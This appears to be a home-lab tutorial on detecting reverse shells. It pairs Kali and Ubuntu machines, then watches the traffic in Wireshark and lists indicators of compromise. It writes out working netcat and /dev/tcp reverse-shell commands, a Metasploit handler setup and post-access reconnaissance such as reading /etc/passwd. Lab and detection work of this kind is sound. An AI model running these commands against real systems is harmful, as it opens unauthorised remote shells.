@@ -1,0 +1,144 @@
+🔴 Reverse Shell Detection — All Commands
+Author: S.Md. Afzal  
+GitHub: SYEDMAHAMMEDAFZAL
+> ⚠️ Educational purposes only. Use only in your own lab environment.
+---
+🖥️ STEP 1: Check Your IPs
+```bash
+# On Kali (Attacker)
+ip a
+# Look for eth0 inet → your Kali IP (e.g. 192.168.1.9)
+
+# On Ubuntu (Victim)
+ip a
+# Look for enp0s3 inet → your Ubuntu IP (e.g. 192.168.1.10)
+```
+---
+📡 STEP 2: Test Connectivity
+```bash
+# On Kali — ping victim
+ping 192.168.1.10 -c 4
+
+# Expected output:
+# 4 packets transmitted, 4 received, 0% packet loss
+```
+---
+🦈 STEP 3: Start Wireshark (Always First!)
+```bash
+# On Kali
+sudo wireshark &
+
+# Then:
+# 1. Double-click eth0 interface
+# 2. Capture starts automatically
+```
+---
+🔗 STEP 4: Netcat Reverse Shell
+```bash
+# ── KALI (Terminal 1) — Start Listener ──
+nc -lvnp 4444
+
+# ── UBUNTU (Victim) — Send Shell Back ──
+bash -i >& /dev/tcp/192.168.1.9/4444 0>&1
+# Replace 192.168.1.9 with YOUR Kali IP
+```
+---
+💻 STEP 5: Commands to Run Inside Shell
+```bash
+# Run these after shell connects on Kali
+whoami        # Shows current user
+hostname      # Shows machine name
+id            # Shows user ID and groups
+uname -a      # Shows full OS/kernel info
+cat /etc/passwd   # Shows all system users
+ifconfig          # Shows network interfaces
+```
+---
+🔍 STEP 6: Wireshark Analysis
+```
+# Filter 1 — Show only shell traffic
+tcp.port == 4444
+
+# Filter 2 — Show victim's outbound traffic
+ip.src == 192.168.1.10
+
+# Filter 3 — Show all new connections
+tcp.flags.syn == 1
+
+# Follow TCP Stream:
+# Right-click any packet → Follow → TCP Stream
+# See all commands in plaintext!
+```
+---
+💾 STEP 7: Save Wireshark Capture
+```
+File → Save As → reverse_shell_capture.pcap
+```
+---
+🚀 STEP 8: Metasploit Reverse Shell
+```bash
+# ── KALI — Launch Metasploit ──
+msfconsole
+
+# ── Configure Handler ──
+use exploit/multi/handler
+set PAYLOAD linux/x86/shell_reverse_tcp
+set LHOST 192.168.1.9
+set LPORT 5555
+run
+
+# ── UBUNTU — Send Shell to Metasploit ──
+bash -i >& /dev/tcp/192.168.1.9/5555 0>&1
+```
+---
+📊 STEP 9: Wireshark Filter for Metasploit
+```
+tcp.port == 5555
+```
+---
+🧹 STEP 10: Clean Up
+```bash
+# Exit reverse shell
+exit
+
+# Stop Wireshark capture
+# Click red Stop button
+
+# Kill Netcat listener
+Ctrl + C
+
+# Exit Metasploit
+exit
+```
+---
+📋 Quick Reference Table
+Command	Machine	Purpose
+`ip a`	Both	Find IP addresses
+`ping IP -c 4`	Kali	Test connectivity
+`sudo wireshark &`	Kali	Start packet capture
+`nc -lvnp 4444`	Kali	Start Netcat listener
+`bash -i >& /dev/tcp/IP/4444 0>&1`	Ubuntu	Send reverse shell
+`whoami`	Inside shell	Check current user
+`uname -a`	Inside shell	Check OS info
+`msfconsole`	Kali	Launch Metasploit
+---
+🔴 Indicators of Compromise (IOCs)
+```
+1. Outbound TCP on port 4444 or 5555 from victim
+2. Plaintext commands visible in TCP stream
+3. Long-duration TCP session
+4. Victim-initiated connection to attacker IP
+5. Shell process making network connections
+```
+---
+📁 Files in This Project
+```
+reverse-shell-detection-lab/
+├── README.md                              ← Project documentation
+├── requirements.txt                       ← Tools list
+├── ALL_COMMANDS_Project3.md              ← This file
+├── Reverse_Shell_Detection_Report.docx   ← Full report
+└── reverse_shell_capture.pcap            ← Wireshark evidence
+```
+---
+S.Md. Afzal | syedmahammedafzal@gmail.com | github.com/SYEDMAHAMMEDAFZAL
